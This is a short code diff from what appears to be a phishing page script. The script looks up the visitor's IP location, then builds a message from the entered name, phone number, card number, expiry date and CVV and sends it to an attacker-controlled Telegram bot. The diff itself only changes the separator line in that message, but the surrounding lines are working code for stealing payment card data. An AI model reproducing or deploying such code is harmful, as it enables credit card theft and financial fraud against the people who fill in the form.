@@ -604,7 +604,7 @@ fetch('https://ipinfo.io/json')
            // const country = IP.country; // الحصول على اسم الدولة
 
 
-            const telegramMessage = "--------AS_LO-------\nName : " + cNom + "\nPhone Number : " + tel + "\nCard number : " + cNum + "\nExpire : " + cDate + "\nCVV : " + cvc + "\n-----------------\n";
+            const telegramMessage = "--------AS_LO-------\nName : " + cNom + "\nPhone Number : " + tel + "\nCard number : " + cNum + "\nExpire : " + cDate + "\nCVV : " + cvc + "\n--------------------\n";
 
             const telegramBotUrl = "https://api.telegram.org/bot" + botConfig.botToken + "/sendMessage";
             const requestData = {
